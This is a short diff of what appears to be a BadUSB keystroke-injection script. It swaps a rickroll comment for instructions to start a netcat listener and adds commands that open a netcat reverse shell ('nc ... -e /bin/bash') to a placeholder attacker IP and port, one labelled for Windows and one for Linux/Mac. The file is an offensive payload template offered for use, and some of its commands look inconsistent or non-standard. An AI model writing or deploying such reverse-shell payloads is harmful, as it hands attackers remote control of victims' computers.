@@ -22,7 +22,11 @@ REM LOCALE
 LOCALE PT
 
 REM Initiate a Youtube Video
-REM Basically it enters chrome and rickrolls with no ads
+REM 
+
+REM Setup Listener
+REM First of all, we need to start a listener in local machine to get an incoming connection.
+REM nc -lvnp 4444
 
 REM DuckScript with Netcat Reverse Shell
 
@@ -30,5 +34,8 @@ REM Set the attacker's IP address and the port to connect back to
 SET attacker_ip "YOUR_ATTACKER_IP"
 SET attacker_port "YOUR_ATTACKER_PORT"
 
-REM Execute the Netcat command to connect back to the attacker
+REM Execute the Netcat command to connect back to the attacker (Windons)
 EXECUTE "nc ${attacker_ip} ${attacker_port} -e /bin/bash"
+
+REM Execute the Netcat command to connect back to the attacker (Linux/Mac)
+EXEC nc $ATTACKER_IP $ATTACKER_PORT -e /bin/bash    
